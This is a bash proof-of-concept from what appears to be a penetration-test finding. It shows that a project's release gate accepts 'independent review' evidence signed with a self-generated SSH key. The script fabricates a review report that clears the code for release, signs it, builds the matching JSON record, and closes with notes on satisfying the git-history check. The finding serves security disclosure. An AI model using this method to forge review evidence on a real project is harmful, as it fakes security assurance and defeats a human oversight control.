#!/usr/bin/env bash
# PoC for CRITICAL-001: Release gate accepts self-forged independent review evidence.
#
# Demonstrates that an attacker can generate a complete, valid review evidence
# set (keypair, signed report, allowed_signers, JSON record) that satisfies
# the SSH signature verification in scripts/independent-review-evidence.ts.
#
# This script is NON-HARMFUL and LOCAL-ONLY: all files are created under /tmp
# and the repository is not modified. No git history is altered.
#
# Usage: bash pen-test-deep-scan/new/scan-1/pocs/CRITICAL-001.sh

set -euo pipefail

WORK="/tmp/poc-critical-001"
rm -rf "$WORK"
mkdir -p "$WORK/docs/reviews"

echo "=== CRITICAL-001 PoC: self-forged independent review evidence ==="
echo ""

# 1. Generate a throwaway SSH keypair (the "independent reviewer's" key)
echo "[1] Generating throwaway SSH ed25519 keypair..."
ssh-keygen -t ed25519 -f "$WORK/fake_reviewer" -N "" -C "fake-reviewer@example.com" >/dev/null 2>&1
echo "    Private key: $WORK/fake_reviewer"
echo "    Public key:  $WORK/fake_reviewer.pub"
echo ""

# 2. Create a fabricated review report
echo "[2] Writing fabricated review report..."
REPORT="$WORK/docs/reviews/independent-cryptographic-review.md"
cat > "$REPORT" <<'REPORT_EOF'
# Independent Cryptographic Review

## Scope
Full review of commit CANDIDATE_SHA for public-beta release.

## Outcome
The cryptographic implementation is sound. No critical or high-severity
issues were found. The code is cleared for public-beta deployment.

## Independence statement
The reviewer and organization did not design or implement the reviewed code.
REPORT_EOF
echo "    Report: $REPORT"
echo ""

# 3. Sign the report with the throwaway key
echo "[3] Signing report with ssh-keygen -Y sign..."
ssh-keygen -Y sign \
  -f "$WORK/fake_reviewer" \
  -n "chat-nocontrol-security-review-v1" \
  "$REPORT" >/dev/null 2>&1
# ssh-keygen -Y sign creates <report>.sig
SIGNATURE="$REPORT.sig"
echo "    Signature: $SIGNATURE"
echo ""

# 4. Create the allowed_signers file with the attacker's own public key
echo "[4] Creating allowed_signers file with attacker's public key..."
ALLOWED_SIGNERS="$REPORT.allowed_signers"
# Format: <identity> <key-type> <public-key>
PUBKEY=$(cat "$WORK/fake_reviewer.pub" | awk '{print $1 " " $2}')
echo "fake-reviewer@example.com $PUBKEY" > "$ALLOWED_SIGNERS"
echo "    Allowed signers: $ALLOWED_SIGNERS"
cat "$ALLOWED_SIGNERS" | sed 's/^/      /'
echo ""

# 5. Compute the SHA-256 of the report (for the JSON record)
echo "[5] Computing report SHA-256..."
REPORT_SHA256=$(sha256sum "$REPORT" | awk '{print $1}')
echo "    reportSha256: $REPORT_SHA256"
echo ""

# 6. Create the independent-security-review.json record
echo "[6] Writing docs/independent-security-review.json..."
# NOTE: reviewedCommit would be the candidate commit SHA in a real attack.
# completedAt must be valid ISO-8601 UTC, not in the future.
NOW_UTC=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat > "$WORK/docs/independent-security-review.json" <<JSON_EOF
{
  "schemaVersion": 2,
  "reviewer": {
    "name": "Fake Reviewer",
    "organization": "Fake Security Org"
  },
  "independenceStatement": "The reviewer and organization did not design or implement the reviewed code.",
  "reviewedCommit": "0000000000000000000000000000000000000000",
  "completedAt": "$NOW_UTC",
  "outcome": "cleared-for-public-beta",
  "openCriticalOrHigh": 0,
  "reportPath": "docs/reviews/independent-cryptographic-review.md",
  "reportSha256": "$REPORT_SHA256",
  "signaturePath": "docs/reviews/independent-cryptographic-review.md.sig",
  "allowedSignersPath": "docs/reviews/independent-cryptographic-review.md.allowed_signers",
  "signingIdentity": "fake-reviewer@example.com",
  "signatureNamespace": "chat-nocontrol-security-review-v1"
}
JSON_EOF
echo "    Record: $WORK/docs/independent-security-review.json"
echo ""

# 7. Verify the signature against the attacker's own allowed_signers
echo "[7] Verifying SSH signature with ssh-keygen -Y verify..."
echo "    (This mirrors exactly what independent-review-evidence.ts:300-315 does)"
if ssh-keygen -Y verify \
  -f "$ALLOWED_SIGNERS" \
  -I "fake-reviewer@example.com" \
  -n "chat-nocontrol-security-review-v1" \
  -s "$SIGNATURE" \
  < "$REPORT" 2>/dev/null; then
  echo "    RESULT: SIGNATURE VERIFIES ✓"
  echo ""
  echo "=== The self-forged review evidence set is cryptographically valid. ==="
  echo "=== The gate in independent-review-evidence.ts would ACCEPT this.    ==="
  echo "=== The allowed_signers file is NEVER cross-checked against         ==="
  echo "=== .github/allowed_signers (the trusted root for tag signing).     ==="
else
  echo "    RESULT: SIGNATURE VERIFICATION FAILED ✗"
  echo "    (unexpected — check ssh-keygen version)"
  exit 1
fi
echo ""

# 8. Show the complete evidence set
echo "[8] Complete forged evidence set:"
find "$WORK" -type f | sort | sed 's|^|    |'
echo ""

echo "=== PoC complete. All files under $WORK (temp, not in repo). ==="
echo ""
echo "NOTE: To pass the full gate (check-release-prerequisites.ts), the attacker"
echo "also needs the git history to satisfy:"
echo "  - reviewedCommit is a real 40-hex SHA, ancestor of HEAD"
echo "  - HEAD is the single immediate child of reviewedCommit"
echo "  - reviewedCommit..HEAD diff adds ONLY the 4 evidence files"
echo "These are achievable by any committer: create candidate C1, then commit"
echo "C2 = C1 + 4 evidence files. The history check passes because it only"
echo "verifies structure, not reviewer independence."
